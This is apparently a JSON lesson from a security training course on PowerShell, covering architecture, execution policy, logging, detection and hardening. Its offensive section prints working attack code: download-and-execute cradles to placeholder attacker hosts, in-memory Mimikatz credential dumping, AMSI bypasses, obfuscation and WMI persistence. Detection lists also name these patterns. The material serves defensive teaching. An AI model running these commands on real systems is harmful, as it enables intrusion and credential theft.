{
  "lesson_id": "0ca49a92-a3f2-43db-bc8b-0f4868d16855",
  "domain": "system",
  "title": "PowerShell Internals for Security Operations",
  "difficulty": 3,
  "order_index": 9,
  "prerequisites": [
    "sys1-windows-internals-001",
    "sys5-win-services-perms-001"
  ],
  "concepts": [
    "PowerShell Architecture and Runspaces",
    "PowerShell Execution Policy",
    "PowerShell Remoting (PS Remoting, WinRM)",
    "PowerShell Logging and Forensics",
    "Offensive PowerShell Techniques",
    "PowerShell Obfuscation and Evasion",
    "Constrained Language Mode",
    "Just Enough Administration (JEA)",
    "PowerShell-Based Attacks Detection",
    "PowerShell Security Best Practices"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand PowerShell architecture and execution model",
    "Master PowerShell security features and their bypass techniques",
    "Learn offensive PowerShell techniques used by attackers",
    "Understand PowerShell logging for detection and forensics",
    "Implement PowerShell hardening and monitoring",
    "Detect and respond to PowerShell-based attacks"
  ],
  "post_assessment": [
    {
      "question": "What does PowerShell Execution Policy actually prevent?",
      "options": [
        "Running all scripts",
        "Running unsigned scripts by default",
        "Administrative access",
        "Network connections"
      ],
      "correct_answer": 1,
      "explanation": "Execution Policy is NOT a security boundary - it's a safety feature that prevents accidental script execution. It can be easily bypassed and doesn't stop malicious actors.",
      "question_id": "aa90359e-77a2-417e-96fc-417de4551bc3",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "Which PowerShell logging provides the most detailed forensic information?",
      "options": [
        "Module Logging",
        "Script Block Logging",
        "Transcription",
        "Command History"
      ],
      "correct_answer": 1,
      "explanation": "Script Block Logging (Event ID 4104) captures all script blocks executed, including deobfuscated code, making it the most valuable for forensics and threat hunting.",
      "question_id": "6063129b-6b11-4c47-a1e9-9cb47f0d302a",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "What is Constrained Language Mode designed to prevent?",
      "options": [
        "Network access",
        "Accessing dangerous .NET types",
        "File operations",
        "User authentication"
      ],
      "correct_answer": 1,
      "explanation": "Constrained Language Mode restricts access to dangerous .NET types and COM objects, limiting what attackers can do even if they gain PowerShell access.",
      "question_id": "334a9c37-86c2-46cc-bd78-3664a6f8617a",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to PowerShell Security!\n\nPowerShell is the MOST POWERFUL tool on Windows - and that makes it the MOST DANGEROUS when misused.\n\n**Why PowerShell Matters for Security:**\n\n**Red Team Perspective:**\n- 95%+ of modern Windows attacks use PowerShell at some stage\n- Living-off-the-land (LoL) attacks use built-in PowerShell\n- Post-exploitation frameworks (Empire, Covenant) are PowerShell-based\n- Fileless malware executes entirely in PowerShell memory\n- Easy obfuscation makes detection challenging\n\n**Blue Team Perspective:**\n- PowerShell logging is CRITICAL for threat detection\n- Proper hardening reduces attack surface dramatically\n- Understanding attacks enables better detection rules\n- Forensics relies on PowerShell event logs\n- Constrained Language Mode can prevent many attacks\n\n**Real-World Impact:**\n- **APT29** (Cozy Bear) → PowerShell-based malware\n- **Emotet** → PowerShell downloaders\n- **Ransomware** → PowerShell for lateral movement\n- **Living-off-the-Land** → PowerShell is the Swiss Army knife\n\n**What You'll Master:**\n✓ PowerShell architecture and execution model\n✓ Execution Policy (and why it's NOT security)\n✓ Offensive PowerShell techniques\n✓ PowerShell logging and forensics\n✓ Detection and response strategies\n✓ Hardening with Constrained Language Mode and JEA\n\nThis lesson is advanced - but essential for BOTH attackers and defenders!\n\nLet's dive into the most powerful scripting language on Windows!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# PowerShell Architecture\n\n## The PowerShell Stack\n\n```\nPowerShell Execution Model:\n\n┌────────────────────────────────────┐\n│ User Input (Command/Script)        │\n└────────────┬───────────────────────┘\n             │\n             v\n┌────────────────────────────────────┐\n│ PowerShell Parser                  │\n│ - Tokenization                     │\n│ - Abstract Syntax Tree (AST)       │\n└────────────┬───────────────────────┘\n             │\n             v\n┌────────────────────────────────────┐\n│ PowerShell Engine                  │\n│ - Runspace (execution environment) │\n│ - Command Processor                │\n│ - Pipeline Execution               │\n└────────────┬───────────────────────┘\n             │\n             v\n┌────────────────────────────────────┐\n│ .NET Framework / .NET Core         │\n│ - Full access to .NET APIs         │\n│ - System.Management.Automation     │\n└────────────┬───────────────────────┘\n             │\n             v\n┌────────────────────────────────────┐\n│ Windows API / System Resources     │\n│ - File system, registry, network   │\n│ - Processes, services, WMI         │\n└────────────────────────────────────┘\n```\n\n**Key Implications for Security:**\n1. **PowerShell = .NET** → Full .NET framework access\n2. **Runspaces** → Can create hidden execution environments\n3. **Pipeline** → Data flows between commands (obfuscation opportunity)\n4. **Parser** → Can be abused for obfuscation\n\n## PowerShell Versions and Differences\n\n```\nPowerShell Version Timeline:\n\nPowerShell 1.0 (2006)\n- Basic scripting\n- Limited security features\n- Windows Server 2008\n\nPowerShell 2.0 (2009)\n- PowerShell Remoting\n- Background Jobs\n- Still widely used by attackers (downgrade attacks!)\n\nPowerShell 3.0-4.0 (2012-2013)\n- Workflow\n- Improved cmdlets\n\nPowerShell 5.0/5.1 (2016)\n- Script Block Logging ← CRITICAL for security\n- Constrained Language Mode\n- AMSI (Anti-Malware Scan Interface)\n- Current Windows default\n\nPowerShell Core 6.x/7.x (2018+)\n- Cross-platform (Linux, macOS)\n- .NET Core based\n- Side-by-side with PowerShell 5.1\n```\n\n**Security Note:** Attackers often downgrade to PowerShell 2.0 to bypass modern security features!\n\n```powershell\n# Downgrade attack\npowershell.exe -Version 2 -Command \"malicious code\"\n# Bypasses: Script Block Logging, AMSI, Constrained Language Mode\n```\n\n## Runspaces: Hidden Execution Environments\n\n```powershell\n# Creating a hidden runspace (attacker technique)\n$rs = [runspacefactory]::CreateRunspace()\n$rs.Open()\n$ps = [powershell]::Create()\n$ps.Runspace = $rs\n$ps.AddScript({\n    # Malicious code runs here\n    # Won't appear in normal process listings\n}).Invoke()\n\n# Detection difficulty:\n# - Not a separate process\n# - Runs in memory\n# - Limited visibility to monitoring tools\n```"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# PowerShell Execution Policy (The Misunderstood \"Security\" Feature)\n\n## Understanding Execution Policy\n\n```powershell\n# Check current execution policy\nGet-ExecutionPolicy\n\n# Check for all scopes\nGet-ExecutionPolicy -List\n\n# Execution Policy Levels (from most to least restrictive):\n# Restricted     - No scripts allowed (default on Windows client)\n# AllSigned      - Only signed scripts\n# RemoteSigned   - Downloaded scripts must be signed\n# Unrestricted   - All scripts allowed (prompts for downloaded)\n# Bypass         - Nothing blocked, no warnings\n# Undefined      - No policy set\n\n# Set execution policy (requires admin)\nSet-ExecutionPolicy RemoteSigned\nSet-ExecutionPolicy Bypass -Scope Process  # Only current session\n```\n\n## 15+ Ways to Bypass Execution Policy\n\n```powershell\n# Method 1: Bypass flag\npowershell.exe -ExecutionPolicy Bypass -File script.ps1\n\n# Method 2: Process scope\nSet-ExecutionPolicy Bypass -Scope Process -Force\n.\\script.ps1\n\n# Method 3: Read and pipe\nGet-Content script.ps1 | PowerShell.exe -NoProfile -\n\n# Method 4: Download and execute (no disk write)\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\n\n# Method 5: Encode command\n$command = Get-Content script.ps1 -Raw\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\npowershell.exe -EncodedCommand $encodedCommand\n\n# Method 6: Invoke-Command\nInvoke-Command -ScriptBlock { malicious code }\n\n# Method 7: PowerShell Core (pwsh.exe)\npwsh.exe -File script.ps1  # Different binary, different rules\n\n# Method 8: Use different verb\nGet-Content script.ps1 | Invoke-Expression\n\n# Method 9: Function\nfunction Invoke-Malicious { malicious code }\nInvoke-Malicious\n\n# Method 10: From stdin\necho \"malicious code\" | powershell.exe -NoProfile -\n\n# Method 11: Command mode (no file)\npowershell.exe -Command \"& {malicious code}\"\n\n# Method 12: Use gcm (Get-Command) alias\ngcm | where {$_.Name -eq 'script.ps1'} | % {& $_}\n\n# Method 13: Registry modification (persists)\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell -Name ExecutionPolicy -Value Bypass\n\n# Method 14: Sign script with self-signed cert (if AllSigned)\n$cert = New-SelfSignedCertificate -Subject \"CN=PowerShell Code Signing\" -Type CodeSigning -CertStoreLocation Cert:\\CurrentUser\\My\nSet-AuthenticodeSignature script.ps1 -Certificate $cert\n\n# Method 15: Reflective loading via .NET\n[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\"assembly.dll\"))\n```\n\n**KEY LESSON:** Execution Policy is NOT a security boundary!\n- It's a \"safety feature\" to prevent accidents\n- Does NOT stop determined attackers\n- Rely on AppLocker, Device Guard, or Constrained Language Mode instead"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Offensive PowerShell Techniques (Attacker Playbook)\n\n## Technique 1: Fileless Malware\n\n```powershell\n# Download and execute in memory (no disk write)\nIEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\n\n# Modern alternative (TLS 1.2 support)\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')\n\n# Even more stealthy (Invoke-WebRequest)\niwr -Uri 'https://attacker.com/payload.ps1' -UseBasicParsing | iex\n\n# Why fileless?\n# - No file on disk → AV can't scan\n# - Executes entirely in RAM\n# - Minimal forensic evidence\n```\n\n## Technique 2: PowerShell Empire / Covenant\n\n```powershell\n# Empire launcher (encoded)\npowershell.exe -NoP -sta -NonI -W Hidden -Enc WwBSAGUAZgBdAC4AQQBzA...\n\n# Decoded (simplified):\n$wc = New-Object System.Net.WebClient\n$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\n$Script = $wc.DownloadString(\"http://192.168.1.100:8080/stage\")\nIEX $Script\n\n# Establishes C2 channel\n# Runs entirely in PowerShell process\n# Appears as legitimate PowerShell activity\n```\n\n## Technique 3: Credential Harvesting (Mimikatz)\n\n```powershell\n# Load Mimikatz in memory (Invoke-Mimikatz)\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')\n\n# Dump credentials\nInvoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"'\n\n# Export to file\nInvoke-Mimikatz -DumpCreds > creds.txt\n\n# Why PowerShell?\n# - Reflective DLL injection (mimikatz.dll loaded in memory)\n# - No mimikatz.exe on disk\n# - Harder to detect than traditional mimikatz.exe\n```\n\n## Technique 4: Lateral Movement (PSRemoting)\n\n```powershell\n# Enable PSRemoting (if admin on target)\nInvoke-Command -ComputerName TARGET -ScriptBlock {Enable-PSRemoting -Force}\n\n# Execute commands remotely\nInvoke-Command -ComputerName TARGET -ScriptBlock {\n    whoami\n    # Run any code here\n}\n\n# Interactive session\nEnter-PSSession -ComputerName TARGET\n\n# Pass credentials\n$cred = Get-Credential\nInvoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {commands}\n\n# Mass execution (ransomware pattern)\n$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name\nInvoke-Command -ComputerName $computers -ScriptBlock {\n    # Encrypt files\n}\n```\n\n## Technique 5: Obfuscation and Evasion\n\n```powershell\n# String obfuscation\n$cmd = 'I' + 'E' + 'X'\n& $cmd (\"Write-Host 'Malicious'\")\n\n# Character substitution\n${`I`E`X} (\"Write-Host 'Evasion'\")\n\n# Base64 encoding\n$cmd = 'Write-Host \"Malicious\"'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)\n$encoded = [Convert]::ToBase64String($bytes)\npowershell.exe -EncodedCommand $encoded\n\n# Concatenation\n$a='Write-'\n$b='Host '\n$c='\"Evil\"'\niex ($a+$b+$c)\n\n# Reverse\n$cmd = \"]gnirtSteG.)'liveD tsoH-etirW'(]gnirtS[,)93]rahC[]gnirtS[,'tXeI'(ecalpeR.)esreveR.)'\\'(tilpS'liveD tsoH-etirW'[\"\niex $cmd.Reverse()\n\n# Environment variables\n$env:bad = 'IEX'\n& (gci env:bad).Value \"Write-Host 'Hidden'\"\n\n# Invoke-Obfuscation tool (automated)\n# - String obfuscation\n# - Encoding\n# - Token manipulation\n# - Launcher obfuscation\n```\n\n## Technique 6: AMSI Bypass\n\n```powershell\n# AMSI = Anti-Malware Scan Interface\n# Scans PowerShell scripts before execution\n\n# Classic AMSI bypass (patching)\n$a=[Ref].Assembly.GetTypes()\nForeach($b in $a) {\n    if ($b.Name -like \"*iUtils\") {\n        $c=$b\n    }\n}\n$d=$c.GetFields('NonPublic,Static')\nForeach($e in $d) {\n    if ($e.Name -like \"*Context\") {\n        $f=$e\n    }\n}\n$g=$f.GetValue($null)\n[IntPtr]$ptr=$g\n[Int32[]]$buf = @(0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)\n\n# Obfuscated AMSI bypass\n[Ref].Assembly.GetType('System.Management.Automation.'+$('41 6D 73 69 55 74 69 6C 73'-split' '|%{[char][int]\"0x$_\"}|%{$_})-join'').GetField($('61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64'-split' '|%{[char][int]\"0x$_\"}|%{$_})-join'','NonPublic,Static').SetValue($null,$true)\n\n# Result: AMSI disabled, malicious scripts run undetected\n```\n\n## Technique 7: Persistence\n\n```powershell\n# Registry Run key\n$payload = 'powershell.exe -W Hidden -Enc <base64>'\nNew-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value $payload\n\n# Scheduled task\n$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-W Hidden -File C:\\Windows\\Temp\\backdoor.ps1'\n$trigger = New-ScheduledTaskTrigger -AtLogOn\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName 'SystemUpdate' -User 'SYSTEM'\n\n# WMI event subscription (fileless persistence)\n$filterName = 'SystemFilter'\n$consumerName = 'SystemConsumer'\n$payload = 'powershell.exe -W Hidden -Command \"IEX (...)\"'\n\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = $filterName\n    EventNamespace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = $consumerName\n    CommandLineTemplate = $payload\n}\n\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n    Filter = $filter\n    Consumer = $consumer\n}\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# PowerShell Logging and Detection\n\n## Critical Logging Mechanisms\n\n### 1. Script Block Logging (Event ID 4104)\n\n**Most Important for Detection!**\n\n```powershell\n# Enable Script Block Logging (GPO or Registry)\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1 -PropertyType DWord\n\n# Also log invocation info\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name 'EnableScriptBlockInvocationLogging' -Value 1 -PropertyType DWord\n```\n\n**What It Captures:**\n- ALL script blocks executed\n- Deobfuscated code (sees through basic obfuscation!)\n- Automatic logging of \"suspicious\" blocks\n- Event ID 4104 in Microsoft-Windows-PowerShell/Operational log\n\n**Example Log Entry:**\n```\nEvent ID: 4104\nLevel: Warning (for suspicious content)\nPath: Microsoft-Windows-PowerShell/Operational\nMessage:\nCreating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\n```\n\n### 2. Module Logging (Event ID 4103)\n\n```powershell\n# Enable Module Logging\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' -Name 'EnableModuleLogging' -Value 1 -PropertyType DWord\n\n# Log specific modules\nNew-Item -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames'\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames' -Name '*' -Value '*'\n```\n\n**What It Captures:**\n- Pipeline execution details\n- Parameter values\n- Cmdlet invocations\n\n### 3. Transcription Logging\n\n```powershell\n# Enable PowerShell Transcription\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'EnableTranscripting' -Value 1 -PropertyType DWord\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'OutputDirectory' -Value 'C:\\PSTranscripts'\nNew-ItemProperty -Path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'EnableInvocationHeader' -Value 1 -PropertyType DWord\n```\n\n**What It Captures:**\n- Session-based console transcript\n- Input and output\n- Saved as text files\n\n### 4. Command History\n\n```powershell\n# User command history location\n$historyPath = (Get-PSReadlineOption).HistorySavePath\n# Typically: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\nGet-Content $historyPath\n```\n\n## Detection Strategies\n\n### Suspicious Indicators\n\n```powershell\n# Monitor for these patterns in Event ID 4104:\n\n1. Encoded Commands\n   - \"-EncodedCommand\"\n   - \"FromBase64String\"\n   - \"[Convert]::ToBase64\"\n\n2. Download Cradles\n   - \"DownloadString\"\n   - \"DownloadFile\"\n   - \"Invoke-WebRequest\" + \"IEX\"\n   - \"(New-Object Net.WebClient)\"\n\n3. Obfuscation\n   - Excessive backticks: ${`I`E`X}\n   - Character substitution\n   - String concatenation with no purpose\n\n4. Suspicious Cmdlets\n   - \"Invoke-Mimikatz\"\n   - \"Invoke-Expression\" (IEX)\n   - \"Invoke-Command\" to remote systems\n   - \"Start-Process\" with hidden windows\n\n5. AMSI Bypass Attempts\n   - \"AmsiUtils\"\n   - \"amsiInitFailed\"\n   - AMSI.dll manipulation\n\n6. Credential Access\n   - \"sekurlsa::logonpasswords\"\n   - \"Get-Credential\"\n   - \"ConvertFrom-SecureString\"\n\n7. Lateral Movement\n   - \"Invoke-Command -ComputerName\"\n   - \"Enter-PSSession\"\n   - \"New-PSSession\"\n\n8. Persistence\n   - Registry Run keys\n   - \"New-ScheduledTask\"\n   - WMI subscriptions (__EventFilter)\n```\n\n### Hunting Queries (Windows Event Log)\n\n```powershell\n# Find encoded commands\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | \n  Where-Object {$_.Message -match 'EncodedCommand|FromBase64'} | \n  Select-Object TimeCreated, Message\n\n# Find download cradles\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | \n  Where-Object {$_.Message -match 'DownloadString|DownloadFile|IEX.*iwr'} | \n  Select-Object TimeCreated, Message\n\n# Find AMSI bypass attempts\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | \n  Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed'} | \n  Select-Object TimeCreated, Message\n\n# Find Invoke-Mimikatz\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | \n  Where-Object {$_.Message -match 'Invoke-Mimikatz|sekurlsa'} | \n  Select-Object TimeCreated, Message\n\n# Export suspicious events for analysis\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | \n  Where-Object {$_.Message -match 'suspicious|warning|error'} | \n  Export-Csv -Path suspicious_ps.csv\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# PowerShell Hardening and Defense\n\n## 1. Constrained Language Mode (CLM)\n\n**Purpose:** Restrict access to dangerous .NET types and COM objects\n\n```powershell\n# Check current language mode\n$ExecutionContext.SessionState.LanguageMode\n# FullLanguage = No restrictions (default)\n# ConstrainedLanguage = Restricted\n\n# Enable CLM (requires AppLocker or Device Guard)\n# Method 1: AppLocker (simplest)\n# - Create AppLocker policy\n# - PowerShell automatically enters CLM when AppLocker is enforced\n\n# Method 2: Environment variable (temporary)\n$env:__PSLockdownPolicy = 4\n# 0 = FullLanguage\n# 4 = ConstrainedLanguage\n\n# Test CLM restrictions\n[System.Runtime.InteropServices.Marshal]::AllocHGlobal(1000)\n# FullLanguage: Works\n# ConstrainedLanguage: ERROR - Type not allowed\n```\n\n**What CLM Blocks:**\n- Arbitrary .NET type access\n- COM object creation\n- Add-Type (custom C# code)\n- Invoke-Expression with untrusted input\n- WMI methods (many)\n\n**What CLM Allows:**\n- Approved cmdlets\n- Basic PowerShell operations\n- Approved .NET types (safe subset)\n\n**Bypassing CLM:**\n```powershell\n# Downgrade to PowerShell 2.0 (if available)\npowershell.exe -Version 2\n# PowerShell 2.0 doesn't support CLM!\n\n# Mitigation: Disable PowerShell 2.0\nDisable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root\n```\n\n---\n\n## 2. Just Enough Administration (JEA)\n\n**Purpose:** Grant minimal privileges for specific tasks\n\n```powershell\n# Create JEA role capability (example: allow only specific cmdlets)\nNew-PSRoleCapabilityFile -Path .\\Maintenance.psrc\n\n# Edit Maintenance.psrc to allow only specific commands:\n@{\n    VisibleCmdlets = @(\n        'Restart-Service',\n        'Get-Service',\n        @{Name='Stop-Service'; Parameters=@{Name='Name'; ValidateSet='Spooler'}}\n    )\n    VisibleFunctions = @()\n    VisibleExternalCommands = @()\n}\n\n# Create session configuration\nNew-PSSessionConfigurationFile -Path .\\MaintenanceEndpoint.pssc -SessionType RestrictedRemoteServer -RoleDefinitions @{\n    'DOMAIN\\HelpDesk' = @{RoleCapabilities = 'Maintenance'}\n}\n\n# Register endpoint\nRegister-PSSessionConfiguration -Name MaintenanceEndpoint -Path .\\MaintenanceEndpoint.pssc -Force\n\n# Users connect with limited privileges:\nEnter-PSSession -ComputerName Server01 -ConfigurationName MaintenanceEndpoint\n# Can only run: Restart-Service, Get-Service, Stop-Service Spooler\n```\n\n---\n\n## 3. Application Whitelisting (AppLocker / WDAC)\n\n```powershell\n# AppLocker rules for PowerShell\n# - Allow signed scripts only\n# - Block PowerShell 2.0\n# - Allow specific script paths\n\n# Example: Create publisher rule (allow Microsoft-signed only)\nNew-AppLockerPolicy -RuleType Publisher -Path \"C:\\Scripts\\*.ps1\" -Publisher \"O=Microsoft Corporation\" -Xml\n\n# Block PowerShell 2.0 explicitly\n# Create deny rule for powershell.exe v2\n```\n\n---\n\n## 4. Disable Unnecessary Features\n\n```powershell\n# Disable PowerShell 2.0 (CRITICAL!)\nDisable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root\n\n# Disable PSRemoting if not needed\nDisable-PSRemoting -Force\n\n# Remove PowerShell if truly not needed (rare)\n# Use AppLocker to block instead\n```\n\n---\n\n## 5. Network-Level Protection\n\n```powershell\n# Block outbound PowerShell connections (if not needed)\nNew-NetFirewallRule -DisplayName \"Block PS Outbound\" -Direction Outbound -Program \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Action Block\n\n# Monitor WinRM (PSRemoting) connections\nGet-NetTCPConnection -LocalPort 5985,5986\n```\n\n---\n\n## Complete Hardening Checklist\n\n```\n✓ Enable Script Block Logging (Event ID 4104)\n✓ Enable Module Logging\n✓ Enable Transcription Logging\n✓ Disable PowerShell 2.0\n✓ Implement Constrained Language Mode (via AppLocker/WDAC)\n✓ Use Just Enough Administration (JEA) for privileged tasks\n✓ Set Execution Policy to AllSigned (with code signing process)\n✓ Monitor PowerShell event logs in SIEM\n✓ Implement AMSI for real-time scanning\n✓ Disable PSRemoting if not needed\n✓ Use application whitelisting (AppLocker/WDAC)\n✓ Centralize PowerShell logs to prevent tampering\n✓ Alert on suspicious patterns (download cradles, AMSI bypass, etc.)\n✓ Regular review of PowerShell command history\n```"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You're Now a PowerShell Security Expert!\n\n**PHENOMENAL ACHIEVEMENT!** PowerShell security is one of the MOST in-demand skills in cybersecurity today.\n\n## What You've Mastered:\n\n✅ **PowerShell Architecture**: Understand runspaces, execution model, .NET integration\n✅ **Execution Policy**: Know it's NOT security (and 15+ bypass methods)\n✅ **Offensive Techniques**: Fileless malware, credential harvesting, lateral movement\n✅ **Obfuscation**: Understand how attackers hide malicious code\n✅ **Logging**: Master Script Block Logging (4104) and detection strategies\n✅ **Hardening**: Implement Constrained Language Mode, JEA, AppLocker\n✅ **Detection**: Hunt for PowerShell-based attacks in logs\n\n## Why This is POWERFUL:\n\n**Red Team / Penetration Testing:**\n- PowerShell is THE primary post-exploitation tool\n- Living-off-the-land attacks rely on PowerShell\n- You understand the attacker's primary weapon\n\n**Blue Team / Detection Engineering:**\n- 95%+ of modern Windows attacks use PowerShell\n- Script Block Logging is CRITICAL for detection\n- You can build detection rules for PowerShell threats\n\n**Incident Response:**\n- PowerShell logs are goldmines during investigations\n- You can reconstruct attacker actions from Event ID 4104\n- Understand how to hunt for PowerShell-based persistence\n\n**Security Engineering:**\n- Implement proper PowerShell hardening\n- Deploy Constrained Language Mode safely\n- Build JEA endpoints for privileged operations\n\n## Real-World Application:\n\nEvery major Windows breach involves PowerShell:\n- **APT29** → PowerShell C2 frameworks\n- **Emotet** → PowerShell downloaders\n- **Ransomware** → PowerShell for lateral movement\n- **Living-off-the-Land** → PowerShell as Swiss Army knife\n\n## Your Expertise Connects:\n\n**Previous Lessons:**\n- Windows Internals → PowerShell accesses all of it\n- Windows Services → PowerShell can manipulate them\n- Memory Architecture → PowerShell runs in memory\n\n**Next Steps:**\n- Malware Analysis → Many use PowerShell\n- Red Team Operations → PowerShell is primary tool\n- SIEM / Detection → PowerShell log analysis\n\n## Practice Challenges:\n\n1. **Set up logging**: Enable Script Block Logging in a test VM\n2. **Hunt threats**: Search your logs for download cradles\n3. **Test CLM**: Deploy Constrained Language Mode and test restrictions\n4. **Build JEA**: Create a JEA endpoint for a specific task\n5. **Simulate attack**: Run a benign PowerShell Empire stager and detect it\n\n## Industry Demand:\n\n**Job roles needing this skill:**\n- Detection Engineer (write PowerShell detection rules)\n- Incident Responder (analyze PowerShell artifacts)\n- Red Team Operator (use PowerShell for post-exploitation)\n- Security Architect (design PowerShell hardening strategy)\n- SOC Analyst (hunt PowerShell-based threats)\n\n**You now understand:**\n- Why Execution Policy is useless against attackers\n- How Script Block Logging (4104) saves the day\n- Why Constrained Language Mode matters\n- How attackers use PowerShell for every stage of attack\n\nThis is EXPERT-level Windows security knowledge. You should be incredibly proud!\n\nKeep building - you're becoming a true Windows security master!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# PowerShell Security Knowledge Check\n\n## 1. Execution Policy Reality Check\n\n**Question:** A junior analyst says \"We're safe from PowerShell attacks because Execution Policy is set to Restricted.\"\n\n**What's wrong with this statement?**\n___________________________________________\n___________________________________________\n\n**How would you explain the reality?**\n___________________________________________\n\n---\n\n## 2. Incident Response Scenario\n\n**You find this in Event ID 4104:**\n```\npowershell.exe -NoP -sta -NonI -W Hidden -Enc WwBSAGUAZgBdAC4AQQBzA...\n```\n\n**Questions:**\n1. What are the red flags?\n2. How would you decode the command?\n3. What should you check next?\n\n**Your IR Plan:**\n___________________________________________\n___________________________________________\n\n---\n\n## 3. Detection Rule Design\n\n**Create a detection rule for PowerShell download cradles.**\n\n**What Event ID?**\n___________________________________________\n\n**What patterns to match?**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n\n---\n\n## 4. Hardening Strategy\n\n**Your organization needs to harden PowerShell. Prioritize these controls:**\n\n1. Most Important: ___________________________________\n2. Second Priority: ___________________________________\n3. Third Priority: ___________________________________\n4. Additional: ___________________________________\n5. Additional: ___________________________________\n\n**Explain your #1 choice:**\n___________________________________________\n\n---\n\n## 5. Attack Chain Analysis\n\n**Map this attack to PowerShell techniques:**\n\n**Attack:** Ransomware spreads via PSRemoting\n\n**PowerShell techniques used:**\n1. ___________________________________\n2. ___________________________________\n3. ___________________________________\n\n**How would you detect each stage?**\n___________________________________________\n\n---\n\n## 6. Constrained Language Mode\n\n**Scenario:** You deploy CLM but users complain they can't run legitimate scripts.\n\n**Questions:**\n- What might be breaking?\n- How do you balance security vs usability?\n- What alternative approaches exist?\n\n**Your Solution:**\n___________________________________________\n___________________________________________"
      }
    }
  ]
}